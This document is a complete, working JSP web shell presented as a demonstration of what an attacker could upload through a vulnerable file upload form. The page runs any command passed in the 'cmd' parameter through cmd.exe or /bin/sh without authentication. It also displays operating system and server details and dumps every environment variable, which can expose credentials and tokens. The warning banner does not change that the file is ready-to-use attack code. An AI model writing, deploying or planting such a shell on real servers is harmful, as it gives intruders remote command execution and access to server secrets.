<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<html>
<head>
    <title>JSP Shell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
        pre { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .command { margin-bottom: 20px; }
        input[type="text"] { width: 80%; padding: 8px; border: 1px solid #ced4da; border-radius: 4px; }
        input[type="submit"] { padding: 8px 15px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover { background-color: #c82333; }
        .container { max-width: 900px; margin: 0 auto; }
        .alert { padding: 15px; margin-bottom: 20px; border-radius: 4px; }
        .alert-danger { background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <h2>JSP Web Shell</h2>
        <div class="alert alert-danger">
            <strong>Warning:</strong> This is a demonstration of a web shell that could be uploaded through a vulnerable file upload function.
            In a real attack scenario, this file could be used to execute arbitrary commands on the server.
        </div>
        
        <div class="command">
            <form method="GET">
                <input type="text" name="cmd" placeholder="Enter command (e.g., dir, ls, whoami)..." value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "" %>">
                <input type="submit" value="Execute">
            </form>
        </div>
        
        <% if(request.getParameter("cmd") != null) { %>
            <h3>Command Output:</h3>
            <pre>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null && !cmd.isEmpty()) {
        try {
            Process p;
            if(System.getProperty("os.name").toLowerCase().contains("windows")) {
                p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
            } else {
                p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            }
            
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while((line = br.readLine()) != null) {
                out.println(line);
            }
            
            // Also capture error stream
            br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while((line = br.readLine()) != null) {
                out.println("<span style='color:red;'>" + line + "</span>");
            }
            
            p.waitFor();
        } catch(Exception e) {
            out.println("Error executing command: " + e.getMessage());
        }
    }
%>
            </pre>
        <% } %>
        
        <h3>System Information:</h3>
        <pre>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
Java: <%= System.getProperty("java.version") %> <%= System.getProperty("java.vendor") %>
User: <%= System.getProperty("user.name") %>
Working Directory: <%= System.getProperty("user.dir") %>
Server: <%= application.getServerInfo() %>
Servlet API: <%= application.getMajorVersion() %>.<%= application.getMinorVersion() %>
JSP Version: <%= JspFactory.getDefaultFactory().getEngineInfo().getSpecificationVersion() %>
        </pre>
        
        <h3>Environment Variables:</h3>
        <pre>
<%
    Map<String, String> env = System.getenv();
    for(String key : new TreeSet<>(env.keySet())) {
        out.println(key + "=" + env.get(key));
    }
%>
        </pre>
    </div>
</body>
</html>